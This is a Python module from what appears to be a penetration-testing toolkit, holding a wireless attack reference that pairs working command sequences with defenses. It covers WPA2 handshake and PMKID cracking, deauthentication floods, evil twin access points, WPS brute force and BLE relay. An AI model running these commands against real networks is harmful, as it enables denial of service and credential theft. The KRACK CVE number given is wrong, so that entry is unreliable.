#!/usr/bin/env python3
"""AEGIS Wireless Security Operations — WiFi, Bluetooth, BLE reference and tool commands."""
import os, sys, subprocess
from datetime import datetime

class WirelessOps:
    name = "Wireless Security Operations"
    description = "WiFi/Bluetooth/BLE reconnaissance, attack reference, and tool command guides"
    category = "network"
    mitre = ["T1557.001", "T1200", "T1587.001"]

    WIFI_ATTACKS = [
        {"name": "Monitor Mode Setup", "category": "setup",
         "commands": ["sudo airmon-ng check kill", "sudo airmon-ng start wlan0", "sudo iwconfig wlan0mon"],
         "description": "Put wireless interface into monitor mode for packet capture",
         "defense": "Not an attack — required for wireless auditing"},
        {"name": "Network Discovery", "category": "recon",
         "commands": ["sudo airodump-ng wlan0mon", "sudo airodump-ng wlan0mon --band abg", "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"],
         "description": "Discover nearby WiFi networks, clients, signal strength, encryption",
         "defense": "Cannot be prevented — passive monitoring"},
        {"name": "WPA2 Handshake Capture", "category": "attack",
         "commands": ["sudo airodump-ng -c <channel> --bssid <bssid> -w handshake wlan0mon", "sudo aireplay-ng -0 5 -a <bssid> -c <client> wlan0mon", "aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap"],
         "description": "Capture 4-way handshake via deauthentication, then crack offline",
         "defense": "Use WPA3, strong passwords (>12 chars random), 802.11w (management frame protection)"},
        {"name": "PMKID Capture", "category": "attack",
         "commands": ["sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng", "hcxpcapngtool pmkid.pcapng -o hash.22000", "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt"],
         "description": "Capture PMKID from AP without client deauthentication — stealthier than handshake capture",
         "defense": "WPA3, strong passwords, disable PMKID (router-dependent)"},
        {"name": "Deauthentication Flood", "category": "attack",
         "commands": ["sudo aireplay-ng -0 0 -a <bssid> wlan0mon", "sudo mdk4 wlan0mon d -B <bssid>"],
         "description": "Continuously deauthenticate all clients from target AP (DoS)",
         "defense": "802.11w (protected management frames), WPA3, WIDS"},
        {"name": "Evil Twin AP", "category": "attack",
         "commands": ["sudo hostapd-mana hostapd.conf", "sudo dnsmasq -C dnsmasq.conf", "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE"],
         "description": "Create fake AP mimicking target, capture credentials via captive portal",
         "defense": "802.1X enterprise auth, certificate pinning, VPN policy, WIDS"},
        {"name": "WPS PIN Attack", "category": "attack",
         "commands": ["wash -i wlan0mon", "sudo reaver -i wlan0mon -b <bssid> -vv", "sudo bully -b <bssid> -e <essid> -c <channel> wlan0mon"],
         "description": "Brute-force WPS PIN (8 digits, reduced to ~11000 attempts)",
         "defense": "Disable WPS entirely on the router"},
        {"name": "Pixie Dust (Offline WPS)", "category": "attack",
         "commands": ["sudo reaver -i wlan0mon -b <bssid> -K 1 -vv"],
         "description": "Exploit weak WPS random number generation for instant PIN recovery",
         "defense": "Disable WPS, update router firmware"},
        {"name": "KRACK Attack Reference", "category": "reference",
         "commands": ["# CVE-2017-16281 — Key Reinstallation Attack", "# Affects WPA2 4-way handshake", "# Patched in most modern firmware"],
         "description": "Force nonce reuse in WPA2 handshake to decrypt/forge packets",
         "defense": "Update all WiFi devices firmware, WPA3"},
        {"name": "Karma/MANA Attack", "category": "attack",
         "commands": ["sudo hostapd-mana /etc/hostapd-mana/hostapd-mana.conf", "# MANA responds to all probe requests"],
         "description": "Respond to any device probe request, impersonating any remembered network",
         "defense": "Remove saved networks, disable auto-connect, use VPN"},
    ]

    BLUETOOTH_ATTACKS = [
        {"name": "Bluetooth Discovery", "category": "recon",
         "commands": ["sudo hcitool scan", "sudo hcitool inq", "sudo sdptool browse <addr>", "sudo btscanner"],
         "description": "Discover nearby Bluetooth Classic devices and services",
         "defense": "Set devices to non-discoverable when not pairing"},
        {"name": "BLE Scanning", "category": "recon",
         "commands": ["sudo hcitool lescan", "sudo bettercap -eval 'ble.recon on'", "gatttool -b <addr> --primary", "gatttool -b <addr> --characteristics"],
         "description": "Discover BLE devices and enumerate GATT services/characteristics",
         "defense": "Use BLE privacy (random MAC rotation), require bonding"},
        {"name": "BlueBorne Reference", "category": "reference",
         "commands": ["# CVE-2017-0781 through CVE-2017-0785", "# RCE via Bluetooth without pairing", "# Affects Linux, Android, Windows, iOS"],
         "description": "Collection of Bluetooth vulnerabilities allowing RCE without pairing",
         "defense": "Patch all devices, disable Bluetooth when not in use"},
        {"name": "KNOB Attack", "category": "reference",
         "commands": ["# CVE-2019-9506 — Key Negotiation of Bluetooth", "# Forces 1-byte encryption key"],
         "description": "Downgrade Bluetooth encryption key to 1 byte for trivial brute force",
         "defense": "Firmware updates, Bluetooth 5.1+ with stronger key negotiation"},
        {"name": "BLE Relay Attack", "category": "attack",
         "commands": ["# Use BtleJuice or GATTacker", "btlejuice-proxy -i hci0", "btlejuice -u <websocket_url> -w"],
         "description": "Relay BLE communication between device and legitimate peripheral from distance",
         "defense": "Timing-based relay detection, distance bounding protocols"},
    ]

    def __init__(self, target=None, options=None):
        self.target = target
        self.options = options or {}
        self.findings = []
        self.actions = []

    def _log(self, msg):
        self.actions.append({"time": datetime.now().isoformat(), "action": msg})
        print(f"  [WIRELESS] {msg}")

    def check_interfaces(self):
        results = {}
        try:
            iw = subprocess.run(['iwconfig'], capture_output=True, timeout=5)
            results["interfaces"] = iw.stdout.decode(errors='replace') + iw.stderr.decode(errors='replace')
        except FileNotFoundError:
            results["interfaces"] = "iwconfig not found"
        try:
            air = subprocess.run(['airmon-ng'], capture_output=True, timeout=5)
            results["airmon"] = air.stdout.decode(errors='replace')
        except FileNotFoundError:
            results["airmon"] = "airmon-ng not found — install aircrack-ng"
        self._log("Checked wireless interfaces")
        return results

    def list_attacks(self, category=None):
        attacks = self.WIFI_ATTACKS + self.BLUETOOTH_ATTACKS
        if category:
            attacks = [a for a in attacks if a['category'] == category]
        print("\n  WIRELESS ATTACK REFERENCE")
        print("  " + "=" * 60)
        for a in attacks:
            print(f"\n  [{a['name']}] ({a['category']})")
            print(f"  {a['description']}")
            print(f"  Commands:")
            for cmd in a['commands']:
                print(f"    $ {cmd}")
            print(f"  Defense: {a['defense']}")
        return attacks

    def run(self, confirm_fn=None):
        op = self.options.get('operation', 'list')
        if op == 'list':
            return self.list_attacks()
        elif op == 'interfaces':
            return self.check_interfaces()
        elif op == 'wifi':
            return self.list_attacks('attack')
        elif op == 'bluetooth':
            return self.BLUETOOTH_ATTACKS
        return {"error": f"Unknown operation: {op}"}

    def get_findings(self):
        return self.findings

if __name__ == "__main__":
    w = WirelessOps(options={'operation': sys.argv[1] if len(sys.argv) > 1 else 'list'})
    w.run()
